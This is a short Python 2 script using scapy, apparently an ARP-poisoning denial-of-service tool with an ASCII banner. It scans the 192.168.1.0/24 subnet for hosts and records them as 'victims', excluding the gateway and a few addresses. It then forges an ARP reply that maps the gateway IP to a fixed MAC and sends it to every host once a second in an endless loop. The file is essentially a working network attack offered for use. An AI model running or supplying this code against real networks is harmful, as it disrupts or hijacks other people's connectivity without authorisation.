from scapy.all import *
import sys,os,time
victims={}

def display_banner():
    os.system("clear")
    print ' _____          _'                        
    print '/ ____|        (_)'                       
    print '| (___    __ _  _  _ __  ___   _   _  ___'
    print " \___ \  / _` || || '__|/ _ \ | | | |/ __|"
    print " ____) || (_| || || |  | (_) || |_| |\__ \\"
    print '|_____/  \__,_||_||_|   \___/  \__,_||___/'
    print '\n',

def gather_targets():
	print "[*] Gather phase..."
	try:
		os.remove("arpDos_file")
	except:
		pass
	f=open("arpDos_file","w")
	with f as sys.stdout:
		ans,unans=srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst="192.168.1.0/24"),timeout=2,verbose=0)
		ans.summary(lambda (s,r): r.sprintf("%Ether.src% %ARP.psrc%") )
	sys.stdout = sys.__stdout__
	f=open("arpDos_file","r")
	for i in f.readlines():
		mac=i.split()[0]
		ip=i.split()[1]
		if not victims.has_key(ip):
			victims[ip]=mac
	for i in "192.168.1.1","192.168.1.154","192.168.1.155","192.168.1.156":		
		del victims[i]
	#del victims["192.168.1.1"]
		
	for key, value in victims.iteritems():
		print key, value
	print "[*] Gather phase complete"
	
def build_packet():
	print "[*]Building packet..."
	pkt=ARP()
	pkt.op="is-at"
	pkt.hwsrc="9c:2a:70:6a:ef:97" #must be MAC valid in network (?)
	pkt.psrc="192.168.1.1"
	print "[*] Building complete..."
	return pkt
	
def poison(pkt): #Alice Cooper Rocks https://www.youtube.com/watch?v=Qq4j1LtCdww
	print "[*] Poisoning, have fun... :)"
	while(True):
		for key, value in victims.iteritems():
			pkt.hwdst=value #mac change for each host
			pkt.pdst=key #ip change for each host
			sendp(pkt,verbose=0)
		time.sleep(1)
		

def main():
	display_banner()
	gather_targets()#builds dictionary {ip,mac}
	poison(build_packet())#build_packet builds an ARP reply with no dst.MAC and dst.IP. needs a scapy packet as arg. poison does what is says, poisons the targets
	return 0

if __name__ == '__main__':
	main()

